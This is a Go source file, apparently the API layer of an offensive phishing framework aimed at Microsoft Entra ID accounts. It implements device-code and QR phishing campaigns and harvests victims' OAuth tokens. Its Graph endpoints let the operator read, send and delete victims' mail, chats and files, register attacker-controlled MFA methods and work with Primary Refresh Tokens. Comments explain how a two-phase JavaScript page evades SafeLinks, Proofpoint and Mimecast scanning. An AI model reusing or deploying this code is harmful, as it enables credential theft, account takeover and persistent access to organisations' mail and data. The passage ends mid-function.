package api

import (
	"context"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/bl4cksku11/entraith/internal/auth"
	"github.com/bl4cksku11/entraith/internal/campaigns"
	"github.com/bl4cksku11/entraith/internal/mailer"
	"github.com/bl4cksku11/entraith/internal/web"
	"github.com/bl4cksku11/entraith/internal/modules/devicereg"
	mfapkg "github.com/bl4cksku11/entraith/internal/modules/mfa"
	"github.com/bl4cksku11/entraith/internal/modules/graph"
	prtpkg "github.com/bl4cksku11/entraith/internal/modules/prt"
	"github.com/bl4cksku11/entraith/internal/modules/tokenexchange"
	"github.com/bl4cksku11/entraith/internal/store"
	"github.com/bl4cksku11/entraith/internal/targets"
)

type Handler struct {
	Manager        *campaigns.Manager
	Mailer         *mailer.Manager
	Store          *store.Store
	WebhookLogPath string
	Listener       *WebhookListener
}

func NewHandler(mgr *campaigns.Manager, mail *mailer.Manager, webhookLogPath string, db *store.Store) *Handler {
	return &Handler{
		Manager:        mgr,
		Mailer:         mail,
		Store:          db,
		WebhookLogPath: webhookLogPath,
		Listener:       NewWebhookListener(webhookLogPath),
	}
}

// authMiddleware validates session cookies for all /api/* routes except /api/auth/login.
func (h *Handler) authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Pass through non-API paths (webhook receiver etc.)
		if !strings.HasPrefix(r.URL.Path, "/api/") {
			next.ServeHTTP(w, r)
			return
		}
		// Login endpoint is public
		if r.URL.Path == "/api/auth/login" {
			next.ServeHTTP(w, r)
			return
		}
		cookie, err := r.Cookie("session")
		if err != nil || cookie.Value == "" {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusUnauthorized)
			json.NewEncoder(w).Encode(map[string]string{"error": "unauthorized"})
			return
		}
		sess, err := h.Store.GetSession(cookie.Value)
		if err != nil || sess == nil || time.Now().After(sess.ExpiresAt) {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusUnauthorized)
			json.NewEncoder(w).Encode(map[string]string{"error": "unauthorized"})
			return
		}
		next.ServeHTTP(w, r)
	})
}

func (h *Handler) Routes() http.Handler {
	mux := http.NewServeMux()

	// Auth routes
	mux.HandleFunc("POST /api/auth/login", h.authLogin)
	mux.HandleFunc("POST /api/auth/logout", h.authLogout)
	mux.HandleFunc("GET /api/auth/check", h.authCheck)

	// Campaign routes
	mux.HandleFunc("GET /api/campaigns", h.listCampaigns)
	mux.HandleFunc("POST /api/campaigns", h.createCampaign)
	mux.HandleFunc("GET /api/campaigns/{id}", h.getCampaign)
	mux.HandleFunc("GET /api/campaigns/{id}/status", h.getCampaignStatus)
	mux.HandleFunc("POST /api/campaigns/{id}/launch", h.launchCampaign)
	mux.HandleFunc("POST /api/campaigns/{id}/stop", h.stopCampaign)
	mux.HandleFunc("GET /api/campaigns/{id}/tokens", h.getTokens)
	mux.HandleFunc("GET /api/campaigns/{id}/sessions", h.getSessions)

	// Target routes
	mux.HandleFunc("POST /api/campaigns/{id}/targets/import", h.importTargets)
	mux.HandleFunc("GET /api/campaigns/{id}/targets", h.listTargets)
	mux.HandleFunc("DELETE /api/campaigns/{id}/targets/{targetId}", h.deleteTarget)
	mux.HandleFunc("POST /api/campaigns/{id}/targets/{targetId}/launch", h.launchForTarget)
	mux.HandleFunc("POST /api/campaigns/{id}/targets/{targetId}/regen", h.regenCode)
	mux.HandleFunc("POST /api/campaigns/{id}/regen-all", h.regenAll)

	// Email sending
	mux.HandleFunc("POST /api/campaigns/{id}/send-emails", h.sendEmails)
	mux.HandleFunc("POST /api/campaigns/{id}/targets/{targetId}/send-email", h.sendEmailToTarget)
	mux.HandleFunc("GET /api/campaigns/{id}/email-results", h.getEmailResults)

	// QR phishing
	mux.HandleFunc("POST /api/campaigns/{id}/qr-emails", h.sendQREmails)
	mux.HandleFunc("GET /api/campaigns/{id}/qr-scans", h.listQRScans)

	// Per-target token operations
	mux.HandleFunc("POST /api/campaigns/{id}/tokens/{targetId}/refresh", h.refreshToken)
	mux.HandleFunc("GET /api/campaigns/{id}/tokens/{targetId}/access-token", h.downloadAccessToken)
	mux.HandleFunc("GET /api/campaigns/{id}/tokens/{targetId}/refresh-token", h.downloadRefreshToken)

	// Graph API post-exploitation (GraphRunner-style)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/emails", h.graphSearchEmails)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/files", h.graphSearchFiles)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/teams", h.graphGetTeams)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/chats", h.graphGetChats)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/deploy-app", h.graphDeployApp)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/mailboxes", h.graphDiscoverMailboxes)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/groups", h.graphGetGroups)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/owned-groups", h.graphGetOwnedGroups)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/clone-group", h.graphCloneGroup)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/users", h.graphSearchUsers)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/conditional-access", h.graphDumpConditionalAccess)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/apps", h.graphDumpApps)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/grants", h.graphGetGrants)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/me", h.graphGetMe)

	// Drive filesystem navigation
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/drive/ls", h.graphDriveLs)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/drive/download", h.graphDriveDownload)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/drive/upload", h.graphDriveUpload)
	mux.HandleFunc("DELETE /api/campaigns/{id}/graph/{targetId}/drive/item", h.graphDriveDelete)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/drive/recent", h.graphDriveRecent)

	// Mail operations
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/mail/folders", h.graphMailFolders)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/mail/messages", h.graphMailMessages)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/mail/messages/{msgId}", h.graphMailGetMessage)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mail/send", h.graphMailSend)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mail/messages/{msgId}/reply", h.graphMailReply)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mail/messages/{msgId}/forward", h.graphMailForward)
	mux.HandleFunc("DELETE /api/campaigns/{id}/graph/{targetId}/mail/messages/{msgId}", h.graphMailDelete)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mail/messages/{msgId}/move", h.graphMailMove)

	// Auth methods
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/auth-methods", h.graphAuthMethods)

	// Teams interactive
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/teams/{teamId}/channels", h.graphTeamChannels)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/teams/{teamId}/channels/{chanId}/messages", h.graphChannelMessages)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/teams/{teamId}/channels/{chanId}/messages", h.graphSendChannelMessage)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/chats/{chatId}/messages", h.graphChatMessages)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/chats/{chatId}/messages", h.graphSendChatMessage)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/chats/create", h.graphCreateChat)

	// Group details
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/groups/{groupId}", h.graphGroupInfo)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/groups/{groupId}/members", h.graphGroupMembers)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/groups/{groupId}/transitive-members", h.graphGroupTransitiveMembers)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/groups/{groupId}/owners", h.graphGroupOwners)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/groups/{groupId}/member-of", h.graphGroupMemberOf)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/groups/{groupId}/drives", h.graphGroupDrives)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/groups/{groupId}/sites", h.graphGroupSites)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/groups/{groupId}/app-roles", h.graphGroupAppRoles)

	// User details
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/users/{userId}", h.graphUserInfo)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/users/{userId}/member-of", h.graphUserMemberOf)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/users/{userId}/batch", h.graphUserBatch)

	// M365 Search
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/search", h.graphSearch)

	// Drive extra
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/drive/shared", h.graphDriveShared)

	// Mail extra
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/mail/messages/{msgId}/attachments", h.graphMailListAttachments)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/mail/messages/{msgId}/attachments/{attId}", h.graphMailDownloadAttachment)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mail/messages/{msgId}/permanent-delete", h.graphMailPermanentDelete)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mail/draft", h.graphMailCreateDraft)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mail/messages/{msgId}/attach", h.graphMailAddAttachment)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mail/messages/{msgId}/send-draft", h.graphMailSendDraft)

	// MFA (mysignins API — uses target refresh token to get MFA-scoped access token)
	mux.HandleFunc("GET /api/campaigns/{id}/graph/{targetId}/mfa/methods", h.mfaListMethods)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mfa/session", h.mfaGetSession)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mfa/add-phone", h.mfaAddPhone)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mfa/add-email", h.mfaAddEmail)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mfa/add-app", h.mfaAddApp)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mfa/register-totp", h.mfaRegisterTOTP)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mfa/verify", h.mfaVerify)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mfa/delete", h.mfaDeleteMethod)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mfa/fido2/begin", h.mfaFIDO2Begin)
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/mfa/fido2/complete", h.mfaFIDO2Complete)

	// Custom API request
	mux.HandleFunc("POST /api/campaigns/{id}/graph/{targetId}/custom", h.graphCustomRequest)

	// Token exchange
	mux.HandleFunc("POST /api/campaigns/{id}/tokens/{targetId}/exchange", h.tokenExchange)

	// Utility
	mux.HandleFunc("POST /api/util/tenant-lookup", h.utilTenantLookup)

	// Device certificates
	mux.HandleFunc("GET /api/device-certs", h.listDeviceCerts)
	mux.HandleFunc("POST /api/device-certs", h.createDeviceCert)
	mux.HandleFunc("POST /api/device-certs/import", h.importDeviceCert)
	mux.HandleFunc("DELETE /api/device-certs/{id}", h.deleteDeviceCert)

	// Primary Refresh Tokens
	mux.HandleFunc("GET /api/prts", h.listPRTs)
	mux.HandleFunc("POST /api/prts/request", h.requestPRT)
	mux.HandleFunc("POST /api/prts/import", h.importPRT)
	mux.HandleFunc("DELETE /api/prts/{id}", h.deletePRT)
	mux.HandleFunc("POST /api/prts/{id}/access-token", h.prtToAccessToken)
	mux.HandleFunc("GET /api/prts/{id}/cookie", h.prtToCookie)

	// WinHello Keys
	mux.HandleFunc("GET /api/winhello-keys", h.listWinHelloKeys)
	mux.HandleFunc("POST /api/winhello-keys", h.registerWinHelloKey)
	mux.HandleFunc("DELETE /api/winhello-keys/{id}", h.deleteWinHelloKey)

	// OTP secrets / TOTP
	mux.HandleFunc("GET /api/otp-secrets", h.listOTPSecrets)
	mux.HandleFunc("POST /api/otp-secrets", h.addOTPSecret)
	mux.HandleFunc("DELETE /api/otp-secrets/{id}", h.deleteOTPSecret)
	mux.HandleFunc("GET /api/otp-secrets/{id}/code", h.generateOTPCode)

	// Request templates
	mux.HandleFunc("GET /api/request-templates", h.listRequestTemplates)
	mux.HandleFunc("POST /api/request-templates", h.saveRequestTemplate)
	mux.HandleFunc("DELETE /api/request-templates/{id}", h.deleteRequestTemplate)

	// Export & delete
	mux.HandleFunc("GET /api/campaigns/{id}/export", h.exportCampaign)
	mux.HandleFunc("DELETE /api/campaigns/{id}", h.deleteCampaign)

	// SSE for real-time updates
	mux.HandleFunc("GET /api/campaigns/{id}/events", h.streamEvents)

	// Webhook / telemetry receiver
	mux.HandleFunc("POST /receive", h.receiveWebhook)

	// Webhook listener control
	mux.HandleFunc("GET /api/webhook/status", h.webhookStatus)
	mux.HandleFunc("POST /api/webhook/start", h.webhookStart)
	mux.HandleFunc("POST /api/webhook/stop", h.webhookStop)
	mux.HandleFunc("GET /api/webhook/logs", h.webhookLogs)

	// Sender profiles
	mux.HandleFunc("GET /api/mailer/profiles", h.listProfiles)
	mux.HandleFunc("POST /api/mailer/profiles", h.createProfile)
	mux.HandleFunc("DELETE /api/mailer/profiles/{id}", h.deleteProfile)
	mux.HandleFunc("POST /api/mailer/profiles/{id}/test", h.testProfile)

	// Email templates
	mux.HandleFunc("GET /api/mailer/templates", h.listTemplates)
	mux.HandleFunc("POST /api/mailer/templates", h.createTemplate)
	mux.HandleFunc("PUT /api/mailer/templates/{id}", h.updateTemplate)
	mux.HandleFunc("DELETE /api/mailer/templates/{id}", h.deleteTemplate)

	return h.authMiddleware(mux)
}

// QRScanHandler returns two http.HandlerFunc values for the public /qr/{token} endpoints.
//   GET  /qr/{token}         — scanner bait: serves an intermediate JS page that does nothing
//                              by itself. Security scanners follow the URL and get an inert page.
//   POST /qr/{token}/confirm — real trigger: called by JS on the target's actual browser.
//                              This is where MarkQRScanned / LaunchForTarget / SendEmailToTarget run.
// Register both on the main router (not /api/) so they require no auth.
func (h *Handler) QRScanHandler() (get http.HandlerFunc, confirm http.HandlerFunc) {
	get = func(w http.ResponseWriter, r *http.Request) {
		h.handleQRScanGet(w, r)
	}
	confirm = func(w http.ResponseWriter, r *http.Request) {
		h.handleQRScanConfirm(w, r)
	}
	return
}

// --- Auth handlers ---

func (h *Handler) authLogin(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Username == "" || body.Password == "" {
		writeError(w, 400, "username and password required")
		return
	}
	user, err := h.Store.GetUserByUsername(body.Username)
	if err != nil || user == nil {
		writeError(w, 401, "invalid credentials")
		return
	}
	if !auth.VerifyPassword(body.Password, user.PasswordHash, user.Salt) {
		writeError(w, 401, "invalid credentials")
		return
	}
	token := auth.GenerateToken()
	expiresAt := time.Now().Add(24 * time.Hour)
	if err := h.Store.CreateSession(token, user.ID, expiresAt); err != nil {
		writeError(w, 500, "session creation failed")
		return
	}
	h.Store.CleanupSessions()
	http.SetCookie(w, &http.Cookie{
		Name:     "session",
		Value:    token,
		Path:     "/",
		HttpOnly: true,
		SameSite: http.SameSiteStrictMode,
		MaxAge:   86400,
	})
	writeJSON(w, 200, map[string]string{"status": "ok", "username": user.Username})
}

func (h *Handler) authLogout(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("session")
	if err == nil && cookie.Value != "" {
		h.Store.DeleteSession(cookie.Value)
	}
	http.SetCookie(w, &http.Cookie{
		Name:   "session",
		Value:  "",
		Path:   "/",
		MaxAge: -1,
	})
	writeJSON(w, 200, map[string]string{"status": "logged_out"})
}

func (h *Handler) authCheck(w http.ResponseWriter, r *http.Request) {
	// If we get here, auth middleware already validated the session.
	writeJSON(w, 200, map[string]string{"status": "ok"})
}

// --- Campaign handlers ---

func (h *Handler) listCampaigns(w http.ResponseWriter, r *http.Request) {
	all := h.Manager.AllCampaigns()
	writeJSON(w, 200, all)
}

func (h *Handler) createCampaign(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Name        string `json:"name"`
		Description string `json:"description"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, 400, "invalid body")
		return
	}
	if body.Name == "" {
		writeError(w, 400, "name required")
		return
	}
	id := fmt.Sprintf("camp-%d", time.Now().UnixMilli())
	c := h.Manager.NewCampaign(id, body.Name, body.Description)
	writeJSON(w, 201, c)
}

func (h *Handler) getCampaign(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	c, ok := h.Manager.GetCampaign(id)
	if !ok {
		writeError(w, 404, "campaign not found")
		return
	}
	writeJSON(w, 200, c)
}

func (h *Handler) getCampaignStatus(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	status, err := h.Manager.GetStatus(id)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	writeJSON(w, 200, status)
}

func (h *Handler) launchCampaign(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if err := h.Manager.Launch(id); err != nil {
		writeError(w, 400, err.Error())
		return
	}
	h.Manager.NotifySSE(id)
	writeJSON(w, 200, map[string]string{"status": "launched"})
}

func (h *Handler) stopCampaign(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if err := h.Manager.Stop(id); err != nil {
		writeError(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "stopped"})
}

func (h *Handler) getTokens(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	tokens, err := h.Manager.GetTokens(id)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	writeJSON(w, 200, tokens)
}

func (h *Handler) getSessions(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	c, ok := h.Manager.GetCampaign(id)
	if !ok {
		writeError(w, 404, "campaign not found")
		return
	}
	sessions := map[string]interface{}{}
	if c.Engine != nil {
		for tid, snap := range c.Engine.AllSessions() {
			sessions[tid] = snap
		}
	}
	// Add QR-sent placeholder sessions for targets without a real device code session.
	if qrScans, err := h.Store.ListQRScans(id); err == nil {
		seen := make(map[string]bool)
		for _, scan := range qrScans {
			if _, has := sessions[scan.TargetID]; has {
				continue
			}
			if seen[scan.TargetID] {
				continue
			}
			seen[scan.TargetID] = true
			sessions[scan.TargetID] = map[string]interface{}{
				"target_id":    scan.TargetID,
				"target_email": scan.TargetEmail,
				"state":        6,
				"state_str":    "qr_sent",
				"issued_at":    scan.CreatedAt,
				"user_code":    "",
			}
		}
	}
	writeJSON(w, 200, map[string]interface{}{"sessions": sessions})
}

func (h *Handler) importTargets(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	c, ok := h.Manager.GetCampaign(id)
	if !ok {
		writeError(w, 404, "campaign not found")
		return
	}

	contentType := r.Header.Get("Content-Type")
	var reader io.Reader = r.Body

	if strings.Contains(contentType, "multipart/form-data") {
		r.ParseMultipartForm(10 << 20)
		file, _, err := r.FormFile("file")
		if err != nil {
			writeError(w, 400, "file field required")
			return
		}
		defer file.Close()
		reader = file
	}

	imported, skipped, errs := targets.ImportCSV(reader, c.Targets)

	// Persist newly added targets to the database
	for _, t := range c.Targets.All() {
		h.Manager.SaveTargetToDB(id, t)
	}

	writeJSON(w, 200, map[string]interface{}{
		"imported": imported,
		"skipped":  skipped,
		"errors":   errs,
	})
}

func (h *Handler) listTargets(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	c, ok := h.Manager.GetCampaign(id)
	if !ok {
		writeError(w, 404, "campaign not found")
		return
	}
	writeJSON(w, 200, c.Targets.All())
}

// --- Email sending handlers ---

func (h *Handler) sendEmails(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")

	var body struct {
		ProfileID  string `json:"profile_id"`
		TemplateID string `json:"template_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, 400, "invalid body")
		return
	}
	if body.ProfileID == "" || body.TemplateID == "" {
		writeError(w, 400, "profile_id and template_id required")
		return
	}

	profile, ok := h.Mailer.GetProfile(body.ProfileID)
	if !ok {
		writeError(w, 404, "sender profile not found")
		return
	}
	tmpl, ok := h.Mailer.GetTemplate(body.TemplateID)
	if !ok {
		writeError(w, 404, "email template not found")
		return
	}

	results, err := h.Manager.SendEmails(id, profile, tmpl)
	if err != nil {
		writeError(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]interface{}{"results": results})
}

func (h *Handler) sendEmailToTarget(w http.ResponseWriter, r *http.Request) {
	campaignID := r.PathValue("id")
	targetID := r.PathValue("targetId")
	var body struct {
		ProfileID  string `json:"profile_id"`
		TemplateID string `json:"template_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, 400, "invalid body"); return
	}
	if body.ProfileID == "" || body.TemplateID == "" {
		writeError(w, 400, "profile_id and template_id required"); return
	}
	profile, ok := h.Mailer.GetProfile(body.ProfileID)
	if !ok { writeError(w, 404, "sender profile not found"); return }
	tmpl, ok := h.Mailer.GetTemplate(body.TemplateID)
	if !ok { writeError(w, 404, "email template not found"); return }
	res, err := h.Manager.SendEmailToTarget(campaignID, targetID, profile, tmpl)
	if err != nil { writeError(w, 400, err.Error()); return }
	writeJSON(w, 200, res)
}

func (h *Handler) sendQREmails(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var body struct {
		ProfileID    string `json:"profile_id"`
		QRTemplateID string `json:"qr_template_id"`
		DCTemplateID string `json:"dc_template_id"`
		DCProfileID  string `json:"dc_profile_id"`
		BaseURL      string `json:"base_url"`
		TargetID     string `json:"target_id"` // optional — send to one target only
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, 400, "invalid body"); return
	}
	if body.ProfileID == "" || body.QRTemplateID == "" || body.DCTemplateID == "" || body.BaseURL == "" {
		writeError(w, 400, "profile_id, qr_template_id, dc_template_id, base_url required"); return
	}
	if body.DCProfileID == "" {
		body.DCProfileID = body.ProfileID
	}
	profile, ok := h.Mailer.GetProfile(body.ProfileID)
	if !ok { writeError(w, 404, "sender profile not found"); return }
	qrTmpl, ok := h.Mailer.GetTemplate(body.QRTemplateID)
	if !ok { writeError(w, 404, "qr_template not found"); return }
	results, err := h.Manager.SendQREmails(id, profile, qrTmpl, body.DCTemplateID, body.DCProfileID, body.BaseURL, body.TargetID)
	if err != nil { writeError(w, 400, err.Error()); return }
	writeJSON(w, 200, map[string]interface{}{"results": results})
}

func (h *Handler) listQRScans(w http.ResponseWriter, r *http.Request) {
	scans, err := h.Store.ListQRScans(r.PathValue("id"))
	if err != nil { writeError(w, 500, err.Error()); return }
	if scans == nil {
		scans = []store.QRScanRow{}
	}
	writeJSON(w, 200, scans)
}

// isMobileUA returns true when the User-Agent string contains at least one
// indicator that the request originates from a mobile browser. This is a
// secondary heuristic — the primary gate is the JS two-phase confirm flow.
func isMobileUA(ua string) bool {
	ua = strings.ToLower(ua)
	for _, tok := range []string{"mobile", "android", "iphone", "ipad", "ipod", "ios"} {
		if strings.Contains(ua, tok) {
			return true
		}
	}
	return false
}

// handleQRScanGet is Phase 1 of the two-phase QR scan flow.
//
// Security scanners (SafeLinks, Proofpoint, Mimecast…) follow URLs found in
// emails and QR codes, but they do not execute JavaScript that makes secondary
// network requests. By returning an inert HTML page here and deferring all
// real side-effects to the POST /confirm endpoint (called by JS), we ensure
// that automated scanners never trigger the device code launch or DC email.
//
// What this handler does:
//   - Validates the token exists in the DB (returns 404 for unknown tokens).
//   - Serves a minimal HTML page whose only job is to JS-fetch POST /qr/<token>/confirm
//     and then redirect the browser to microsoft.com/devicelogin.
//   - No scan is recorded, no email is sent, no device code is touched.
func (h *Handler) handleQRScanGet(w http.ResponseWriter, r *http.Request) {
	token := r.PathValue("token")
	scan, err := h.Store.GetQRScan(token)
	if err != nil || scan == nil {
		http.Error(w, "Not found", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	// Replace {{TOKEN}} in qrlanding.html with the real token.
	// strings.ReplaceAll is used instead of fmt.Fprintf to avoid treating
	// the HTML as a Go format string (any stray % in CSS/SVG would break it).
	io.WriteString(w, strings.ReplaceAll(web.QRLandingHTML, "{{TOKEN}}", token))
}

// handleQRScanConfirm is Phase 2 of the two-phase QR scan flow.
//
// Called by the JS on the target's browser after the GET landing page loads.
// Security scanners are filtered by the JS gate (they don't execute fetch calls).
// No UA check here — it caused false negatives on phones with uncommon UAs.
//
// On every scan:
//   - Records / updates scanned_at timestamp.
//   - Ensures campaign is running (launches if not).
//   - Regenerates the device code (delete old, request new from Microsoft, start polling).
//     This gives the target a fresh code on every scan.
//   - Sends the DC email with the new code.
func (h *Handler) handleQRScanConfirm(w http.ResponseWriter, r *http.Request) {
	token := r.PathValue("token")
	scan, err := h.Store.GetQRScan(token)
	if err != nil || scan == nil {
		http.Error(w, "Not found", http.StatusNotFound)
		return
	}

	now := time.Now().UTC()

	// Record scan timestamp unconditionally — always log the latest scan.
	if err := h.Store.MarkQRScanned(token, now); err != nil {
		log.Printf("[qr] MarkQRScanned failed token=%s: %v", token, err)
	}

	c, ok := h.Manager.GetCampaign(scan.CampaignID)
	if !ok {
		log.Printf("[qr] confirm: campaign not found campaign=%s token=%s", scan.CampaignID, token)
		w.WriteHeader(http.StatusNoContent)
		return
	}

	dcTemplateID, dcProfileID := c.GetQRConfig()
	if dcTemplateID == "" || dcProfileID == "" {
		log.Printf("[qr] confirm: campaign has no QR DC config (template=%q profile=%q) campaign=%s — was QR email sent before scanning?", dcTemplateID, dcProfileID, scan.CampaignID)
		w.WriteHeader(http.StatusNoContent)
		return
	}
	profile, pOK := h.Mailer.GetProfile(dcProfileID)
	tmpl, tOK := h.Mailer.GetTemplate(dcTemplateID)
	if !pOK {
		log.Printf("[qr] confirm: sender profile %q not found campaign=%s", dcProfileID, scan.CampaignID)
		w.WriteHeader(http.StatusNoContent)
		return
	}
	if !tOK {
		log.Printf("[qr] confirm: email template %q not found campaign=%s", dcTemplateID, scan.CampaignID)
		w.WriteHeader(http.StatusNoContent)
		return
	}

	// Ensure campaign is running — launch it if needed.
	if cStatusStr := c.GetStatusStr(); cStatusStr != "running" {
		log.Printf("[qr] confirm: campaign=%s status=%s, launching now", scan.CampaignID, cStatusStr)
		if lerr := h.Manager.Launch(scan.CampaignID); lerr != nil {
			log.Printf("[qr] launch failed campaign=%s: %v", scan.CampaignID, lerr)
			w.WriteHeader(http.StatusNoContent)
			return
		}
		log.Printf("[qr] confirm: campaign=%s launched successfully", scan.CampaignID)
	}

	// Always regenerate the device code so the target gets a fresh code.
	if lerr := h.Manager.RegenerateCode(scan.CampaignID, scan.TargetID); lerr != nil {
		log.Printf("[qr] regen failed (first scan?) campaign=%s target=%s: %v — falling back to LaunchForTarget", scan.CampaignID, scan.TargetID, lerr)
		if lerr2 := h.Manager.LaunchForTarget(scan.CampaignID, scan.TargetID); lerr2 != nil {
			log.Printf("[qr] LaunchForTarget also failed campaign=%s target=%s: %v", scan.CampaignID, scan.TargetID, lerr2)
			w.WriteHeader(http.StatusNoContent)
			return
		}
		log.Printf("[qr] LaunchForTarget succeeded campaign=%s target=%s", scan.CampaignID, scan.TargetID)
	} else {
		log.Printf("[qr] RegenerateCode succeeded campaign=%s target=%s", scan.CampaignID, scan.TargetID)
	}

	// Send DC email with the new code.
	if _, serr := h.Manager.SendEmailToTarget(scan.CampaignID, scan.TargetID, profile, tmpl); serr != nil {
		log.Printf("[qr] send dc email failed campaign=%s target=%s: %v", scan.CampaignID, scan.TargetID, serr)
	} else {
		log.Printf("[qr] DC email sent successfully campaign=%s target=%s", scan.CampaignID, scan.TargetID)
		h.Store.MarkQRDCSent(token)
	}

	// Wake any open SSE connections for this campaign so sessions appear
	// immediately in the dashboard without waiting for the 2-second ticker.
	h.Manager.NotifySSE(scan.CampaignID)

	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) getEmailResults(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	results, err := h.Manager.GetEmailResults(id)
	if err != nil {
		writeError(w, 404, err.Error())
		return
	}
	writeJSON(w, 200, results)
}

// --- Sender profile handlers ---

func (h *Handler) listProfiles(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, h.Mailer.AllProfiles())
}

func (h *Handler) createProfile(w http.ResponseWriter, r *http.Request) {
	var p mailer.SenderProfile
	if err := json.NewDecoder(r.Body).Decode(&p); err != nil {
		writeError(w, 400, "invalid body")
		return
	}
	if p.Name == "" || p.Host == "" || p.FromAddress == "" {
		writeError(w, 400, "name, host, and from_address required")
		return
	}
	if p.Port == 0 {
		p.Port = 587
	}
	p.ID = fmt.Sprintf("prof-%d", time.Now().UnixMilli())
	p.CreatedAt = time.Now().UTC()
	h.Mailer.SaveProfile(&p)
